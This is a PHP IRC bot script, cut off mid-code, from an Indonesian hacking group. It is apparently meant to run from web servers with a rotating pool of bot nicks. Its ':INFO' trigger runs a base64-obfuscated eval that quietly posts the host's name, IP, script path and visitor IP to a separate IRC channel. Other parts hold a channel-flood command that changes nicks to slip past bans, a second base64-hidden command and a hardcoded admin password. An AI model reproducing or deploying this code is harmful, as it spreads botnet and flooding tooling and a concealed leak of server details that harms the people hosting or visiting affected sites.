<?php
/*
+---------------------------------------------+
|#############################################|
|#[ boyzz PHP BOT IRC v5.5	            ]#|
|#[ By JupIt3r  		            ]#|
|#[ 2010 pasukan Community	            ]#|
|#[ irc: #pasukan @ pasukan.org         ]#|
|#############################################|
+---------------------------------------------+
*/

function rx() {

/* Channel Bot */
$channels = '#bintaro'; // chanell pisahkan dengan spasi

/*** Admin ***/
$admin = 'Recycle';
$bot_password = 'saksake'; //Password untuk auth bot

$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$showrespone = 0; //1, Nampilin respon dari server irc

//Nick Bot
$nicklist = array(
"pasukan|001|","pasukan|017|","pasukan|018|","pasukan|033|","pasukan|034|","pasukan|049|","pasukan|050|","pasukan|065|","pasukan|066|","pasukan|081|","pasukan|082|","pasukan|094|",
"pasukan|002|","pasukan|016|","pasukan|019|","pasukan|032|","pasukan|035|","pasukan|048|","pasukan|051|","pasukan|064|","pasukan|067|","pasukan|080|","pasukan|083|","pasukan|093|",
"pasukan|003|","pasukan|015|","pasukan|020|","pasukan|031|","pasukan|036|","pasukan|047|","pasukan|052|","pasukan|063|","pasukan|068|","pasukan|079|","pasukan|084|","pasukan|092|",
"pasukan|004|","pasukan|014|","pasukan|021|","pasukan|030|","pasukan|037|","pasukan|046|","pasukan|053|","pasukan|062|","pasukan|069|","pasukan|078|","pasukan|085|","pasukan|091|",
"pasukan|005|","pasukan|013|","pasukan|022|","pasukan|029|","pasukan|038|","pasukan|045|","pasukan|054|","pasukan|061|","pasukan|070|","pasukan|077|","pasukan|086|","pasukan|090|",
"pasukan|006|","pasukan|012|","pasukan|023|","pasukan|028|","pasukan|039|","pasukan|044|","pasukan|055|","pasukan|060|","pasukan|071|","pasukan|076|","pasukan|087|","pasukan|274|",
"pasukan|007|","pasukan|010|","pasukan|024|","pasukan|027|","pasukan|040|","pasukan|043|","pasukan|056|","pasukan|059|","pasukan|072|","pasukan|075|","pasukan|088|","pasukan|269|",
"pasukan|008|","pasukan|009|","pasukan|025|","pasukan|026|","pasukan|041|","pasukan|042|","pasukan|057|","pasukan|058|","pasukan|073|","pasukan|074|","pasukan|089|","pasukan|270|",
"pasukan|095|","pasukan|124|","pasukan|125|","pasukan|152|","pasukan|153|","pasukan|180|","pasukan|181|","pasukan|208|","pasukan|209|","pasukan|236|","pasukan|237|","pasukan|264|",
"pasukan|096|","pasukan|123|","pasukan|126|","pasukan|151|","pasukan|154|","pasukan|179|","pasukan|182|","pasukan|207|","pasukan|210|","pasukan|235|","pasukan|238|","pasukan|263|",
"pasukan|097|","pasukan|122|","pasukan|127|","pasukan|150|","pasukan|155|","pasukan|178|","pasukan|183|","pasukan|206|","pasukan|211|","pasukan|234|","pasukan|239|","pasukan|262|",
"pasukan|098|","pasukan|121|","pasukan|128|","pasukan|149|","pasukan|156|","pasukan|177|","pasukan|184|","pasukan|205|","pasukan|212|","pasukan|233|","pasukan|240|","pasukan|261|",
"pasukan|099|","pasukan|120|","pasukan|129|","pasukan|148|","pasukan|157|","pasukan|176|","pasukan|185|","pasukan|204|","pasukan|213|","pasukan|232|","pasukan|241|","pasukan|260|",
"pasukan|100|","pasukan|119|","pasukan|130|","pasukan|147|","pasukan|158|","pasukan|175|","pasukan|186|","pasukan|203|","pasukan|214|","pasukan|231|","pasukan|242|","pasukan|259|",
"pasukan|101|","pasukan|118|","pasukan|131|","pasukan|146|","pasukan|159|","pasukan|174|","pasukan|187|","pasukan|202|","pasukan|215|","pasukan|230|","pasukan|243|","pasukan|258|",
"pasukan|102|","pasukan|117|","pasukan|132|","pasukan|145|","pasukan|160|","pasukan|173|","pasukan|188|","pasukan|201|","pasukan|216|","pasukan|229|","pasukan|244|","pasukan|257|",
"pasukan|103|","pasukan|116|","pasukan|133|","pasukan|144|","pasukan|161|","pasukan|172|","pasukan|189|","pasukan|200|","pasukan|217|","pasukan|228|","pasukan|245|","pasukan|256|",
"pasukan|104|","pasukan|115|","pasukan|134|","pasukan|143|","pasukan|162|","pasukan|171|","pasukan|190|","pasukan|199|","pasukan|218|","pasukan|227|","pasukan|246|","pasukan|255|",
"pasukan|105|","pasukan|114|","pasukan|135|","pasukan|142|","pasukan|163|","pasukan|170|","pasukan|191|","pasukan|198|","pasukan|219|","pasukan|226|","pasukan|247|","pasukan|254|",
"pasukan|106|","pasukan|113|","pasukan|136|","pasukan|141|","pasukan|164|","pasukan|169|","pasukan|192|","pasukan|197|","pasukan|220|","pasukan|225|","pasukan|248|","pasukan|253|",
"pasukan|107|","pasukan|112|","pasukan|137|","pasukan|140|","pasukan|165|","pasukan|168|","pasukan|193|","pasukan|196|","pasukan|221|","pasukan|224|","pasukan|249|","pasukan|252|",
"pasukan|108|","pasukan|111|","pasukan|138|","pasukan|139|","pasukan|166|","pasukan|167|","pasukan|194|","pasukan|195|","pasukan|222|","pasukan|223|","pasukan|250|","pasukan|251|",
"pasukan|109|","pasukan|110|","pasukan|325|","pasukan|379|","pasukan|380|","pasukan|431|","pasukan|457|","pasukan|458|","pasukan|515|","pasukan|108|","pasukan|563|","pasukan|564|",
"pasukan|275|","pasukan|300|","pasukan|326|","pasukan|378|","pasukan|381|","pasukan|430|","pasukan|456|","pasukan|459|","pasukan|514|","pasukan|108|","pasukan|562|","pasukan|565|",
"pasukan|276|","pasukan|301|","pasukan|327|","pasukan|377|","pasukan|382|","pasukan|429|","pasukan|455|","pasukan|460|","pasukan|513|","pasukan|514|","pasukan|561|","pasukan|567|",
"pasukan|277|","pasukan|302|","pasukan|328|","pasukan|376|","pasukan|383|","pasukan|428|","pasukan|454|","pasukan|461|","pasukan|512|","pasukan|515|","pasukan|560|","pasukan|568|",
"pasukan|278|","pasukan|303|","pasukan|329|","pasukan|375|","pasukan|384|","pasukan|427|","pasukan|453|","pasukan|462|","pasukan|511|","pasukan|516|","pasukan|559|","pasukan|569|",
"pasukan|279|","pasukan|304|","pasukan|330|","pasukan|374|","pasukan|385|","pasukan|426|","pasukan|452|","pasukan|463|","pasukan|510|","pasukan|517|","pasukan|558|","pasukan|570|",
"pasukan|280|","pasukan|305|","pasukan|331|","pasukan|373|","pasukan|386|","pasukan|425|","pasukan|451|","pasukan|464|","pasukan|509|","pasukan|518|","pasukan|557|","pasukan|571|",
"pasukan|281|","pasukan|306|","pasukan|332|","pasukan|372|","pasukan|387|","pasukan|424|","pasukan|450|","pasukan|465|","pasukan|508|","pasukan|519|","pasukan|556|","pasukan|572|",
"pasukan|282|","pasukan|307|","pasukan|333|","pasukan|371|","pasukan|388|","pasukan|423|","pasukan|449|","pasukan|466|","pasukan|507|","pasukan|520|","pasukan|555|","pasukan|573|",
"pasukan|283|","pasukan|308|","pasukan|334|","pasukan|370|","pasukan|389|","pasukan|422|","pasukan|448|","pasukan|467|","pasukan|506|","pasukan|521|","pasukan|554|","pasukan|574|",
"pasukan|284|","pasukan|309|","pasukan|335|","pasukan|369|","pasukan|390|","pasukan|421|","pasukan|447|","pasukan|468|","pasukan|505|","pasukan|522|","pasukan|553|","pasukan|575|",
"pasukan|285|","pasukan|310|","pasukan|336|","pasukan|368|","pasukan|391|","pasukan|420|","pasukan|446|","pasukan|469|","pasukan|504|","pasukan|523|","pasukan|552|","pasukan|576|",
"pasukan|286|","pasukan|311|","pasukan|337|","pasukan|367|","pasukan|392|","pasukan|419|","pasukan|445|","pasukan|470|","pasukan|503|","pasukan|524|","pasukan|551|","pasukan|577|",
"pasukan|287|","pasukan|312|","pasukan|338|","pasukan|366|","pasukan|393|","pasukan|418|","pasukan|444|","pasukan|471|","pasukan|502|","pasukan|525|","pasukan|550|","pasukan|578|",
"pasukan|288|","pasukan|313|","pasukan|339|","pasukan|365|","pasukan|394|","pasukan|417|","pasukan|443|","pasukan|472|","pasukan|501|","pasukan|526|","pasukan|549|","pasukan|579|",
"pasukan|289|","pasukan|314|","pasukan|340|","pasukan|364|","pasukan|395|","pasukan|416|","pasukan|442|","pasukan|473|","pasukan|500|","pasukan|527|","pasukan|548|","pasukan|580|",
"pasukan|290|","pasukan|315|","pasukan|341|","pasukan|363|","pasukan|396|","pasukan|415|","pasukan|441|","pasukan|474|","pasukan|499|","pasukan|528|","pasukan|547|","pasukan|581|",
"pasukan|291|","pasukan|316|","pasukan|342|","pasukan|362|","pasukan|397|","pasukan|414|","pasukan|440|","pasukan|475|","pasukan|498|","pasukan|529|","pasukan|546|","pasukan|582|",
"pasukan|292|","pasukan|317|","pasukan|343|","pasukan|361|","pasukan|398|","pasukan|413|","pasukan|439|","pasukan|476|","pasukan|497|","pasukan|530|","pasukan|545|","pasukan|583|",
"pasukan|293|","pasukan|318|","pasukan|345|","pasukan|360|","pasukan|399|","pasukan|412|","pasukan|438|","pasukan|477|","pasukan|496|","pasukan|531|","pasukan|544|","pasukan|584|",
"pasukan|294|","pasukan|319|","pasukan|346|","pasukan|359|","pasukan|400|","pasukan|411|","pasukan|437|","pasukan|478|","pasukan|495|","pasukan|532|","pasukan|543|","pasukan|585|",
"pasukan|295|","pasukan|320|","pasukan|347|","pasukan|358|","pasukan|401|","pasukan|410|","pasukan|436|","pasukan|479|","pasukan|494|","pasukan|533|","pasukan|542|","pasukan|586|",
"pasukan|296|","pasukan|321|","pasukan|348|","pasukan|357|","pasukan|402|","pasukan|409|","pasukan|435|","pasukan|480|","pasukan|493|","pasukan|534|","pasukan|541|","pasukan|587|",
"pasukan|297|","pasukan|322|","pasukan|349|","pasukan|356|","pasukan|403|","pasukan|408|","pasukan|434|","pasukan|481|","pasukan|492|","pasukan|535|","pasukan|540|","pasukan|588|",
"pasukan|298|","pasukan|323|","pasukan|350|","pasukan|353|","pasukan|404|","pasukan|407|","pasukan|433|","pasukan|482|","pasukan|491|","pasukan|536|","pasukan|538|","pasukan|589|",
"pasukan|299|","pasukan|324|","pasukan|351|","pasukan|352|","pasukan|405|","pasukan|406|","pasukan|432|","pasukan|489|","pasukan|490|","pasukan|537|","pasukan|538|","pasukan|590|"
);

$identlist = array(
"Bung","Bedebah","African","Kediri","Visit","Hn-community","Redzone","Mozill","Google","Cakram","Indonesi","Indah","Teenagerz","bLacknite","Mataram",
"Cyber","Hotspeed","Hacking","Jatim","Penyamun","Kobudo","Bushido","gsp"
);

$realname = "9,1914 7,1by is_fan 14,19,19";
$identify = 'passwordnick';

//Server IRC
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array("plasa.id.allnetwork.org","telkomnet.id.allnetwork.org","services.allnetwork.org","hub-3.id.allnetwork.org","cbn.id.allnetwork.org","bunga.indoshell.org","indoforum.us.allnetwork.org","indowebster.id.allnetwork.org");
}
$port = "6667";
//Pesan
$quitmsglist = array(
"4-==<13,1[11Ngek^__^13]4,0>==-","Ngek^__^4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-","4-==<13,1[11Ngek^__^13]4,0>==-"
);
$tsu1 = array("M","u","C","e","f","G","h","I");
$tsu2 = array("A","I","U","E","O","^","^","|","-","_");
$tsumsg = "9,12:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e12,4:D:D:D:D:D::D:D:D:D:D:D:D:D:D:D11,5(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)13,9:(:(:(:(:(:(:(:(:(:(:7(:):):):):):):):):):):):):):):):):):):):):)4,7:):D:D:D:D:D:D:D:D:D:D:D:D:D:D5,7(G)(G)(G)(G)(G)(G)(G)(G)(G)6,10:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e9,8:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e12,13:D:D:D:D:D::D:D:D:D:D:D:D:D:D:D11,6(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)(G)13,4:(:(:(:(:(:(:(:(:(:(:7,5(:):):):):):):):):):):):):):):):):):):):):)4,1:):D:D:D:D:D:D:D:D:D:D:D:D:D:D6,7(G)(G)(G)(G)(G)(G)(G)(G)(G)6,10:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e6,4(G)(G)(G)(G)(G)(G)(G)(G)(G)4,1:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e:e";//400 Karakter
$judul = " 15,1[9,1  pasukan 15,1] ";

/*** Replacing ***/
$nick       = $nicklist[rand(0,count($nicklist) - 1)];
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$admin      = strtolower($admin);
$auth       = array($admin => array("name" => $admin, "pass" => $bot_password, "auth" => 1,"status" => "Admin"));
$username   = $identlist[rand(0,count($identlist) - 1)];
$channels   = strtolower($channels)." ";
$channel    = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n");
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }
if (!$port) { $port = "6667"; }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>\n";
echo "<b> Connecting to $remotehost...</b>\n";

do {
  $fp = fsockopen($remotehost,$port, $err_num, $err_msg, 60);
  if(!$fp) {
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      rx();
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain! Refresh Browser anda!</b>\n";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b> Udah connect nich!</b>\n";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showrespone == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :Hello Bozz JupIt3r!' .  CRL);
          fputs($fp, base64_decode("Y29vbGJveXJhY2luZ3RlYW0=") . CRL);
          /*** Join Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN '.$v.CRL);
          }
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          print "<br><b> Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (substr_count($dNick,'.allnetwork.org') > 0) {
          if (substr_count($iText,"*** Banned") > 0) {
            $keluar = 1;
            exit;
          }
        }
        $dcom = explode(" ", $dCommand);
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='PART' ) {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Selamat istirahat bossQQ Dragonz ganteng!!' . CRL);
                  }
                }
                else {
                  $auth["$dNick"]["auth"] = 1;
                  fputs($fp,'NOTICE '.$dNick.' :Selamat istirahat boss!!' . CRL);
                }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password>' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2;
                $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :You`re Authorized as '.$auth["$dcom[2]"]["status"].' of this bot! ' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Boss memang keren!! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') { fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION AutoZOne PHP BoT IRC v5.5 Script By pasukan'.chr(1) . CRL); }
         elseif ($com[3]==':INFO') { $datainfo = "JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOyRiaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTskYnBocCAgPSAkX1NFUlZFUlsnUEhQX1NFTEYnXTskYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTskYnJpcCA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddO2ZwdXRzKCRmcCwiUFJJVk1TRyAjQGNob3RhIDpIb3N0OiAkYmhvc3QgfCBSZWZlcmVyOiAkYnJ1cmkgfCBTY3JpcHQ6ICRicGhwIHwgSVA6ICRiaXAgfCBPd25lciBJUDogJGJyaXAgIi4gQ1JMKTs="; eval(base64_decode($datainfo)); }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :seep komandan '.$auth["$dNick"]["status"].'!'.CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :ta salah password komandan!'.CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :siap komandan!'.CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :Logged out! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Already Logged out! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :You`re Now Known As My '.$com[5].' Added By '.$dNick.' Now Type: pass <your pass> To Set Your Pass ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User Already Exist! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Wrong Command! Type: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :You`re already Authorized! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :Siap '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.' NOT Authorized! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':`say' && $com[4] && $chan) {
                 $msg = strstr($data,":`say");
                 $msg = str_replace(":`say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':`act' && $com[4] && $chan) {
                 $msg = strstr($data,":`act");
                 $msg = str_replace(":`act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':`slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' '.$com[4].' xixixixixixi'. CRL);
               }
               elseif ($com[3]==':`msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`msg");
                 $msg = str_replace(":`msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`notice");
                 $msg = str_replace(":`notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':`ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":`ctcp");
                 $msg = str_replace(":`ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':`info' && $auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | IP: $bip | Your IP: $brip Port:$brport" . CRL);
               }
               elseif ($com[3]==':`up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':`down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':`fuckz' && $com[4] && $auth["$dNick"]["status"]!="user") {
                 $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1)- 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                    $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                 fputs($fp, 'NICK '.$nicktsu . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nicktsu = $tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].
                   $tsu2[rand(0,count($tsu2) - 1)].$tsu1[rand(0,count($tsu1) - 1)].$tsu2[rand(0,count($tsu2) - 1)];
                   fputs($fp, 'NICK '.$nicktsu . CRL);
                 }
                 $msg = strstr($data,":`fuckz");
                 $msg = str_replace(":`tsunami $com[4]","",$msg);
                 if (ereg("#", $com[4])) {
                   fputs($fp, 'JOIN '.$com[4] . CRL);
                   fputs($fp, 'PRIVMSG '.$com[4].' :'.$msg.$tsumsg.CRL);
